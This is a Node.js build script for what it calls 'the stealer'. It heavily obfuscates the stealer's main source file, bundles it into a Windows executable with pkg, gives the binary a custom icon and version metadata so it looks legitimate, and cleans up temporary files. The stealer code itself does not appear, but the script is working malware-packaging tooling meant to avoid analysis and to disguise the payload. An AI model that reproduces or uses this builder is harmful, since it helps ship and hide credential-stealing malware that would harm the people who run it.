(async () => {
  console.clear();
  process.title = "";

  const fs = require("fs"),
    path = require("path"),
    crypto = require("crypto");

  const  confuser = require("js-confuser"),
    chalk = (await import("chalk")).default;

  const tar = require("tar"),
    pkg = require("pkg"),
    resedit = (await import("resedit-cli")).default;

const sleep = (ms) => new Promise(async (resolve) => setTimeout(resolve, ms));

  let name = "app";
  let icon = path.join(__dirname, "resources", "icon", "nearly.ico");
  let version = JSON.parse(await fs.promises.readFile(path.join(__dirname, "resources", "version", "nearly.json")), 'utf-8')

  let source = await fs.promises.readFile(path.join(__dirname, "src", "index.js"), "utf-8");

  console.log(chalk.bold.yellow("[#] Obfuscating the main file of the stealer."));

  let obfuscate;

  try {
    obfuscate = await confuser.obfuscate(source, {
      target: "node",
      preset: "low",
      compact: false,
      hexadecimalNumbers: true,
      minify: false,
      es5: false,
      renameVariables: true,
      renameGlobals: true,
      identifierGenerator: "randomized",
      controlFlowFlattening: 1,
      globalConcealing: false,
      stringCompression: 1,
      stringConcealing: 1,
      stringEncoding: 1,
      stringSplitting: 1,
      duplicateLiteralsRemoval: true,
      dispatcher: 1,
      rgf: 1,
      flatten: 1,
      objectExtraction: false,
      deadCode: 1,
      calculator: 1,
      movedDeclarations: true,
      opaquePredicates: 1,
      shuffle: {
        hash: 0.5,
        true: 0.5,
      },
      stack: 1,
    });

    await fs.promises.writeFile(path.join(__dirname, "src", "index.js"), obfuscate);

    console.log(chalk.bold.green("[#] File obfuscated successfully."));
  } catch (e) {
    return console.log(chalk.bold.red("[@] Error obfuscating the file:", e));
  }


  const gzip = await new Promise(async (resolve) => {
    console.log(chalk.bold.green("[$] Preparing additional resources."));

    await tar
      .create(
        {
          gzip: true,
          file: path.join(__dirname, "src", "app.tgz"),
          cwd: path.join(__dirname, "src"),
        },
        [path.join(__dirname, "resources", "pkg", "node-22.9")]
      )
      .then((buffer) => {
        console.log(chalk.bold.green("[$] Project files compressed"));

        const hash = crypto.createHash("sha256");
        const rs = fs.createReadStream(__dirname + "/src/app.tgz");

        console.log(chalk.bold.yellow("[#] Calculating the SHA-256 hash of the file 'app.tgz'."));

        rs.on("error", (data) => {
          if (data) {
            resolve(false);
          }
        });

        rs.on("data", (data) => {
          hash.update(data);
        });

        rs.on("end", async () => {
          console.log(chalk.bold.green("[$] Calculation successfully performed."));

          await fs.promises.writeFile(path.join(__dirname, "src", "app.tgz.sha256"), hash.digest("hex"));
          resolve(true);
        });
      })
      .catch((o) => {
        if (o) {
          resolve(false);
        }
      });
  });

  if (!gzip) {
    return console.log(chalk.bold.red("[@] Error preparing the additional resources."));
  }

  console.log(chalk.bold.yellow("[#] Creating the executable."));

  try {
    await pkg.exec([
      path.join(__dirname, "src", "index.js"),
     //  '-t', 'node20-windows-x64',
      "-c",
      path.join(__dirname, "src", "package.json"),
      "-o",
      path.join(__dirname, `${name}.exe`),
    ]);

    console.log(chalk.bold.green("[$] Successfully created executable."));
  } catch (e) {
    return console.log(chalk.bold.red("[@] An error occurred during the creation of the executable:", e));
  }

  await sleep(1000);


  console.log(chalk.bold.yellow("[#] Changing the executable information."));

  try {
    await resedit({
      in: `./${name}.exe`,
      out: `./${name}.exe`,
      definition: {
        version: version,
        icons: [
          {
            id: 1,
            sourceFile: icon,
          },
        ],
      },
    });

    console.log(chalk.bold.green("[$] Successfully changed executable information."));
  } catch (e) {
    console.log(e);
    return console.log(chalk.bold.red("[@] An error occurred while changing the executable information."));
  }

  console.log(chalk.bold.yellow("[#] Deleting temporary files."));

  try {
    await fs.promises.unlink(path.join(__dirname, "src", "app.tgz"));
    await fs.promises.unlink(path.join(__dirname, "src", "app.tgz.sha256"));
    return console.log(chalk.bold.green("[$] Files deleted successfully."));
  } catch (e) {
    console.log(chalk.bold.red("[@] An error occurred while deleting the temporaris files:", e));
  }
})();
